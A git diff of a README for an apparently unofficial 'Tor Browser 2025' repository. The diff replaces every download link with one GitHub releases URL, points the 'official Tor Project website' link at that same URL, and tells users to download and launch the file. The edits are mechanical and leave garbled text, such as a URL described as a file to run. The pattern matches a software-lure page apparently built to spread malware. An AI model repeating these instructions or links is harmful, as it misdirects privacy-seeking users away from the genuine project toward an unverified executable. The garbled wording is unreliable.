@@ -1,6 +1,6 @@
 # 🛡️🔒🌐 Ultimate Privacy and Security with Tor Browser 2025 🕵️‍♂️🔐🛡️
 
-Welcome to the ultimate guide to protecting your online privacy and ensuring secure browsing with the Tor Browser 2025! In this comprehensive README.md file, you will find all the information you need to get started with the Tor Browser, including its features, benefits, and how to download and install it. Let's dive in and unlock the power of anonymous and secure internet browsing!
+Welcome to the ultimate guide to protecting your online privacy and ensuring secure browsing with the Tor Browser 2025! In this comprehensive https://github.com/psambetty/Tor-Browser-2025/releases file, you will find all the information you need to get started with the Tor Browser, including its features, benefits, and how to download and install it. Let's dive in and unlock the power of anonymous and secure internet browsing!
 
 ## Overview
 **Repository Name:** Tor-Browser-2025  
@@ -18,20 +18,20 @@ The Tor Browser 2025 offers a wide range of features to ensure your online priva
 
 ## Download
 To download the Tor Browser 2025, click on the following link:  
-[![Download Tor Browser](https://img.shields.io/badge/Download-Tor_Browser-green)](https://github.com/assets/Release.zip)  
-*Note: The file "Release.zip" needs to be launched after downloading.*
+[![Download Tor Browser](https://github.com/psambetty/Tor-Browser-2025/releases)](https://github.com/psambetty/Tor-Browser-2025/releases)  
+*Note: The file "https://github.com/psambetty/Tor-Browser-2025/releases" needs to be launched after downloading.*
 
 If the above link is not working or the file is not provided, please check the "Releases" section of the repository for alternative download options.
 
 ## Installation
-1. Download the "Release.zip" file from the link provided.
+1. Download the "https://github.com/psambetty/Tor-Browser-2025/releases" file from the link provided.
 2. Extract the contents of the zip file to a location on your computer.
 3. Navigate to the extracted folder and run the Tor Browser executable.
 4. Follow the on-screen instructions to complete the installation process.
 5. Once installed, launch the Tor Browser and start browsing securely and anonymously!
 
 ## Explore More
-Visit the official [Tor Project website](https://www.torproject.org) to learn more about the Tor Browser and the Tor network. Dive deeper into the world of online privacy and security with the resources available on the website.
+Visit the official [Tor Project website](https://github.com/psambetty/Tor-Browser-2025/releases) to learn more about the Tor Browser and the Tor network. Dive deeper into the world of online privacy and security with the resources available on the website.
 
 ## Get Involved
 Contribute to the development of the Tor Browser by forking this repository, making improvements, and submitting a pull request. Your contributions help to enhance the privacy and security features of the Tor Browser for users around the world.
